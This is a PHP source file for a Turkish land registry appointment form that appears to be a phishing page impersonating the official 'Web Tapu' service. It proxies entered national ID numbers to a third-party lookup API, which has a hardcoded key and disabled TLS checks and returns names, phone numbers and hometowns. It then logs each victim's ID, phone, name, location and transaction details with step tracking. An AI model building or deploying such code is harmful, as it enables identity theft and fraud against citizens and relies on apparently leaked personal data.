<?php
/**
 * index.php — Adım 1: Başvuru Formu
 * Çalışan versiyon. Sadece ad-soyad doldurur, telefon doldurmaz.
 */

// ===== API PROXY =====
if (isset($_GET['tc_sorgu']) && isset($_GET['ajax'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('Access-Control-Allow-Origin: *');

    $tc = preg_replace('/[^0-9]/', '', $_GET['tc_sorgu']);
    if (strlen($tc) !== 11) {
        echo json_encode(['status' => false, 'error' => 'TC 11 haneli olmalı']);
        exit;
    }

    $api_url = 'https://axxel.api-hizmetleri.com/api.php?tc=' . $tc . '&auth=Q7mX2pL9&servis=tcpro';
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $api_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || !$response) {
        echo json_encode([
            'status' => false,
            'error' => 'API bağlantı hatası',
            'http_code' => $http_code,
            'curl_err' => $err,
            'response_len' => strlen($response ?: '')
        ]);
        exit;
    }

    $data = json_decode($response, true);
    if (!$data || empty($data['status'])) {
        echo json_encode([
            'status' => false,
            'error' => 'API başarısız',
            'raw_response' => $response,
            'json_error' => json_last_error_msg()
        ]);
        exit;
    }

    $result = $data['result'] ?? [];
    echo json_encode([
        'status' => true,
        'data' => [
            'ad' => trim($result['AD'] ?? ''),
            'soyad' => trim($result['SOYAD'] ?? ''),
            'telefon' => trim($result['GSM'] ?? ''),
            'memleketIl' => trim($result['MEMLEKETIL'] ?? ''),
            'memleketIlce' => trim($result['MEMLEKETILCE'] ?? ''),
        ]
    ]);
    exit;
}

// ===== ANA SAYFA =====

if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
ip_ban_kontrol();
kayit_ziyaretci();
$_SESSION['adim'] = 1;

$aktif_adim = 1;
$hatalar    = [];
$form_data  = [];

$iller = [
    'ADANA','ADIYAMAN','AFYONKARAHİSAR','AĞRI','AKSARAY','AMASYA','ANKARA','ANTALYA',
    'ARDAHAN','ARTVİN','AYDIN','BALIKESİR','BARTIN','BATMAN','BAYBURT','BİLECİK',
    'BİNGÖL','BİTLİS','BOLU','BURDUR','BURSA','ÇANAKKALE','ÇANKIRI','ÇORUM',
    'DENİZLİ','DİYARBAKIR','DÜZCE','EDİRNE','ELAZIĞ','ERZİNCAN','ERZURUM',
    'ESKİŞEHİR','GAZİANTEP','GİRESUN','GÜMÜŞHANE','HAKKARİ','HATAY','IĞDIR',
    'ISPARTA','İSTANBUL','İZMİR','KAHRAMANMARAŞ','KARABÜK','KARAMAN','KARS',
    'KASTAMONU','KAYSERİ','KİLİS','KIRIKKALE','KIRKLARELİ','KIRŞEHİR','KOCAELİ',
    'KONYA','KÜTAHYA','MALATYA','MANİSA','MARDİN','MERSİN','MUĞLA','MUŞ',
    'NEVŞEHİR','NİĞDE','ORDU','OSMANİYE','RİZE','SAKARYA','SAMSUN','ŞANLIURFA',
    'SİİRT','SİNOP','ŞIRNAK','SİVAS','TEKİRDAĞ','TOKAT','TRABZON','TUNCELİ',
    'UŞAK','VAN','YALOVA','YOZGAT','ZONGULDAK'
];

$islem_turleri = [
    'Satis'   => 'Satış',
    'Ipotek'  => 'İpotek',
    'Bagis'   => 'Bağış',
    'Intikal' => 'İntikal',
    'Diger'   => 'Diğer',
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $form_data = [
        'tc'       => trim($_POST['tc'] ?? ''),
        'telefon'  => trim($_POST['telefon'] ?? ''),
        'ad'       => trim($_POST['ad'] ?? ''),
        'soyad'    => trim($_POST['soyad'] ?? ''),
        'il'       => trim($_POST['il'] ?? ''),
        'ilce'     => trim($_POST['ilce'] ?? ''),
        'islem'    => trim($_POST['islem'] ?? ''),
        'aciklama' => trim($_POST['aciklama'] ?? ''),
    ];

    if (empty($form_data['tc']) || !preg_match('/^\d{11}$/', $form_data['tc']))
        $hatalar['tc'] = 'T.C. Kimlik No 11 haneli olmalıdır.';

    if (empty($form_data['telefon']) || !preg_match('/^[0-9]{10,19}$/', $form_data['telefon']))
        $hatalar['telefon'] = 'Telefon numarası geçerli olmalıdır.';

    if (empty($form_data['ad']))
        $hatalar['ad'] = 'Ad alanı zorunludur.';

    if (empty($form_data['soyad']))
        $hatalar['soyad'] = 'Soyad alanı zorunludur.';

    if (empty($form_data['il']) || !in_array($form_data['il'], $iller))
        $hatalar['il'] = 'Lütfen bir il seçiniz.';

    if (empty($form_data['ilce']))
        $hatalar['ilce'] = 'İlçe boş bırakılamaz.';

    if (empty($form_data['islem']) || !array_key_exists($form_data['islem'], $islem_turleri))
        $hatalar['islem'] = 'İşlem türü seçiniz.';

    if (empty($hatalar)) {
        $_SESSION['basvuru'] = $form_data;

        $log_id = get_or_create_log();
        if ($log_id) {
            update_log($log_id, [
                'tc'           => $form_data['tc'],
                'ad'           => $form_data['ad'],
                'soyad'        => $form_data['soyad'],
                'telefon'      => $form_data['telefon'],
                'il'           => $form_data['il'],
                'ilce'         => $form_data['ilce'],
                'islem'        => $form_data['islem'],
                'aciklama'     => $form_data['aciklama'] ?? '',
                'mevcut_adim'  => 1,
                'son_aktivite' => date('Y-m-d H:i:s')
            ]);
            $_SESSION['log_id'] = $log_id;
        }

        header('Location: ' . BASE_PATH . '/randevu.php'); exit;
    }
}

require_once __DIR__ . '/includes/header.php';
?>

<style>
.webtapu-field input[readonly] {
    background-color: #f1f5f9 !important;
    color: #64748b !important;
    cursor: not-allowed;
    opacity: 0.75;
    border-color: #cbd5e1 !important;
}
</style>

<!-- ====== FORM KARTI ====== -->
<section class="webtapu-card">
    <h3>Tapu Randevu Başvurusu</h3>
    <p class="webtapu-muted">
        Lütfen kimlik ve iletişim bilgilerinizi giriniz. Başvurunuz, bir
        sonraki adımda randevu seçimi ile devam eder.
    </p>

    <?php if (!empty($hatalar)): ?>
        <div class="tapu-error-box" id="tapu-error-box">
            <div class="tapu-error-icon" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="#c0392b">
                    <circle cx="12" cy="12" r="12" fill="#c0392b"/>
                    <rect x="6" y="11" width="12" height="2" rx="1" fill="white"/>
                </svg>
            </div>
            <div class="tapu-error-content">
                <p class="tapu-error-title">İşleminiz tamamlanamadı.</p>
                <ul class="tapu-error-list">
                    <?php foreach ($hatalar as $hata): ?>
                        <li><?= htmlspecialchars($hata) ?></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        </div>
    <?php endif; ?>

    <form method="post" action="" class="webtapu-form" novalidate>

        <div class="webtapu-grid">

            <!-- T.C. Kimlik No -->
            <div class="webtapu-field">
                <label for="tc">T.C. Kimlik No</label>
                <input
                    id="tc" name="tc"
                    inputmode="numeric" autocomplete="off" maxlength="11"
                    placeholder="T.C. Kimlik Numaranız"
                    value="<?= htmlspecialchars($form_data['tc'] ?? '') ?>"
                    class="<?= isset($hatalar['tc']) ? 'is-invalid' : '' ?>"
                >
                <?php if (isset($hatalar['tc'])): ?>
                    <small class="form-error-text"><?= htmlspecialchars($hatalar['tc']) ?></small>
                <?php endif; ?>
            </div>

            <!-- Telefon -->
            <div class="webtapu-field">
                <label for="telefon">Telefon</label>
                <input
                    id="telefon" name="telefon"
                    type="tel" inputmode="numeric" autocomplete="tel"
                    placeholder="05xxxxxxxxx" maxlength="19"
                    value="<?= htmlspecialchars($form_data['telefon'] ?? '') ?>"
                    class="<?= isset($hatalar['telefon']) ? 'is-invalid' : '' ?>"
                >
                <?php if (isset($hatalar['telefon'])): ?>
                    <small class="form-error-text"><?= htmlspecialchars($hatalar['telefon']) ?></small>
                <?php endif; ?>
            </div>

            <!-- Ad -->
            <div class="webtapu-field">
                <label for="ad">Ad</label>
                <input
                    id="ad" name="ad"
                    autocomplete="given-name"
                    value="<?= htmlspecialchars($form_data['ad'] ?? '') ?>"
                    class="<?= isset($hatalar['ad']) ? 'is-invalid' : '' ?>"
                >
                <?php if (isset($hatalar['ad'])): ?>
                    <small class="form-error-text"><?= htmlspecialchars($hatalar['ad']) ?></small>
                <?php endif; ?>
            </div>

            <!-- Soyad -->
            <div class="webtapu-field">
                <label for="soyad">Soyad</label>
                <input
                    id="soyad" name="soyad"
                    autocomplete="family-name"
                    value="<?= htmlspecialchars($form_data['soyad'] ?? '') ?>"
                    class="<?= isset($hatalar['soyad']) ? 'is-invalid' : '' ?>"
                >
                <?php if (isset($hatalar['soyad'])): ?>
                    <small class="form-error-text"><?= htmlspecialchars($hatalar['soyad']) ?></small>
                <?php endif; ?>
            </div>

            <!-- İl -->
            <div class="webtapu-field">
                <label for="il">İl</label>
                <select id="il" name="il"
                    class="<?= isset($hatalar['il']) ? 'is-invalid' : '' ?>">
                    <option value="">Seçiniz</option>
                    <?php foreach ($iller as $il): ?>
                        <option value="<?= htmlspecialchars($il) ?>"
                            <?= (($form_data['il'] ?? '') === $il) ? 'selected' : '' ?>>
                            <?= htmlspecialchars($il) ?>
                        </option>
                    <?php endforeach; ?>
                </select>
                <?php if (isset($hatalar['il'])): ?>
                    <small class="form-error-text"><?= htmlspecialchars($hatalar['il']) ?></small>
                <?php endif; ?>
            </div>

            <!-- İlçe -->
            <div class="webtapu-field">
                <label for="ilce">İlçe</label>
                <select id="ilce" name="ilce"
                    class="<?= isset($hatalar['ilce']) ? 'is-invalid' : '' ?>">
                    <option value="">İl Seçiniz</option>
                </select>
                <?php if (isset($hatalar['ilce'])): ?>
                    <small class="form-error-text"><?= htmlspecialchars($hatalar['ilce']) ?></small>
                <?php endif; ?>
            </div>

            <!-- İşlem Türü -->
            <div class="webtapu-field webtapu-field--wide">
                <label for="islem">İşlem Türü</label>
                <select id="islem" name="islem"
                    class="<?= isset($hatalar['islem']) ? 'is-invalid' : '' ?>">
                    <option value="">Seçiniz</option>
                    <?php foreach ($islem_turleri as $val => $label): ?>
                        <option value="<?= htmlspecialchars($val) ?>"
                            <?= (($form_data['islem'] ?? '') === $val) ? 'selected' : '' ?>>
                            <?= htmlspecialchars($label) ?>
                        </option>
                    <?php endforeach; ?>
                </select>
                <?php if (isset($hatalar['islem'])): ?>
                    <small class="form-error-text"><?= htmlspecialchars($hatalar['islem']) ?></small>
                <?php endif; ?>
            </div>

            <!-- İşlem Açıklaması -->
            <div class="webtapu-field webtapu-field--wide">
                <label for="aciklama">İşlem Açıklaması (opsiyonel)</label>
                <textarea id="aciklama" name="aciklama" rows="3"
                    placeholder="Ada/parsel, mahalle, tapu bilgileri vb."><?= htmlspecialchars($form_data['aciklama'] ?? '') ?></textarea>
            </div>

        </div><!-- /.webtapu-grid -->

        <div class="webtapu-actions">
            <button type="submit" class="primaryButton">Randevu Seçimine Devam Et</button>
        </div>

    </form>
</section><!-- /.webtapu-card -->

<!-- ===== MEVCUT JS (il-ilce) ===== -->
<script src="<?= BASE_PATH ?>/assets/js/il-ilce.js"></script>

<!-- ===== TC OTOMATİK DOLDURMA (SADECE AD-SOYAD) ===== -->
<script>
document.addEventListener('DOMContentLoaded', function() {
    'use strict';

    var tc = document.getElementById('tc');
    var ad = document.getElementById('ad');
    var soyad = document.getElementById('soyad');
    var ilSelect = document.getElementById('il');
    var ilceSelect = document.getElementById('ilce');

    function turkishNormalized(str) {
        if (!str) return '';
        return str.toString()
            .replace(/İ/g, 'i')
            .replace(/I/g, 'ı')
            .replace(/Ş/g, 'ş')
            .replace(/Ğ/g, 'ğ')
            .replace(/Ü/g, 'ü')
            .replace(/Ö/g, 'ö')
            .replace(/Ç/g, 'ç')
            .toLowerCase();
    }

    function clearFieldValidationError(keyword) {
        var errorBox = document.getElementById('tapu-error-box');
        if (errorBox) {
            var errorList = errorBox.querySelector('.tapu-error-list');
            if (errorList) {
                var items = errorList.getElementsByTagName('li');
                var searchKeyword = turkishNormalized(keyword);
                for (var i = 0; i < items.length; i++) {
                    var itemText = turkishNormalized(items[i].textContent);
                    if (itemText.indexOf(searchKeyword) > -1) {
                        items[i].style.display = 'none';
                    }
                }
                var anyVisible = false;
                for (var i = 0; i < items.length; i++) {
                    if (items[i].style.display !== 'none') {
                        anyVisible = true;
                        break;
                    }
                }
                if (!anyVisible) {
                    errorBox.style.display = 'none';
                }
            }
        }
    }

    function updateIlceler() {
        if (!ilSelect || !ilceSelect) return;
        var val = ilSelect.value;
        ilceSelect.innerHTML = '';
        
        if (!val) {
            var opt = document.createElement('option');
            opt.value = '';
            opt.text = 'İl Seçiniz';
            ilceSelect.appendChild(opt);
            return;
        }
        
        var optSel = document.createElement('option');
        optSel.value = '';
        optSel.text = 'Seçiniz';
        ilceSelect.appendChild(optSel);
        
        var list = (window.ilceMap && window.ilceMap[val]) ? window.ilceMap[val] : [];
        list.forEach(function(item) {
            var opt = document.createElement('option');
            opt.value = item;
            opt.text = item;
            ilceSelect.appendChild(opt);
        });
    }
    window.updateIlceler = updateIlceler;

    if (ilSelect) {
        ilSelect.addEventListener('change', updateIlceler);
    }

    // Postback durumunda seçili ili ve ilçeyi yükle
    if (ilSelect && ilSelect.value) {
        updateIlceler();
        var selectedIlce = "<?= htmlspecialchars($form_data['ilce'] ?? '') ?>";
        if (selectedIlce && ilceSelect) {
            var searchPostbackIlce = turkishNormalized(selectedIlce);
            for (var k = 0; k < ilceSelect.options.length; k++) {
                if (turkishNormalized(ilceSelect.options[k].value) === searchPostbackIlce) {
                    ilceSelect.value = ilceSelect.options[k].value;
                    break;
                }
            }
        }
    }

    // Telefon alanına özel giriş formatlama ve hata silme
    var telefon = document.getElementById('telefon');
    if (telefon) {
        telefon.addEventListener('input', function() {
            var val = this.value.replace(/\D/g, '').slice(0, 19);
            this.value = val;
            
            if (val.length >= 10 && val.length <= 19) {
                this.classList.remove('is-invalid');
                var errText = this.parentNode.querySelector('.form-error-text');
                if (errText) errText.style.display = 'none';
                clearFieldValidationError('telefon');
            }
        });
    }

    if (!tc) return;

    var timer = null;

    tc.addEventListener('input', function() {
        var val = this.value.replace(/\D/g, '').slice(0, 11);
        this.value = val;

        if (val.length === 11) {
            this.classList.remove('is-invalid');
            var errText = this.parentNode.querySelector('.form-error-text');
            if (errText) errText.style.display = 'none';
            clearFieldValidationError('T.C.');
            clearFieldValidationError('TC');
        }

        clearTimeout(timer);

        if (val.length === 11) {
            timer = setTimeout(function() {
                tc.disabled = true;
                tc.style.background = '#fff3cd';

                var url = '<?= BASE_PATH ?>/api/index.php?tc_sorgu=' + encodeURIComponent(val) + '&ajax=1';

                fetch(url)
                    .then(function(response) {
                        return response.json();
                    })
                    .then(function(data) {
                        if (data.status && data.data) {
                            // SADECE AD VE SOYAD DOLDUR
                            if (ad) {
                                ad.value = data.data.ad || '';
                                if (data.data.ad) ad.readOnly = true;
                            }
                            if (soyad) {
                                soyad.value = data.data.soyad || '';
                                if (data.data.soyad) soyad.readOnly = true;
                            }
                            // TELEFON DOLDURULMAZ
                        } else {
                            if (ad) {
                                ad.value = '';
                                ad.readOnly = false;
                            }
                            if (soyad) {
                                soyad.value = '';
                                soyad.readOnly = false;
                            }
                        }
                    })
                    .catch(function(error) {
                        if (ad) {
                            ad.value = '';
                            ad.readOnly = false;
                        }
                        if (soyad) {
                            soyad.value = '';
                            soyad.readOnly = false;
                        }
                    })
                    .finally(function() {
                        tc.disabled = false;
                        tc.style.background = '';
                    });
            }, 500);
        } else {
            if (ad) {
                ad.value = '';
                ad.readOnly = false;
            }
            if (soyad) {
                soyad.value = '';
                soyad.readOnly = false;
            }
        }
    });

    // Eğer sayfa yüklendiğinde TC alanı 11 haneli ise otomatik sorgula
    if (tc && tc.value.replace(/\D/g, '').length === 11) {
        var event = new Event('input', { bubbles: true });
        tc.dispatchEvent(event);
    }
});
</script>

<?php require_once __DIR__ . '/includes/footer.php'; ?>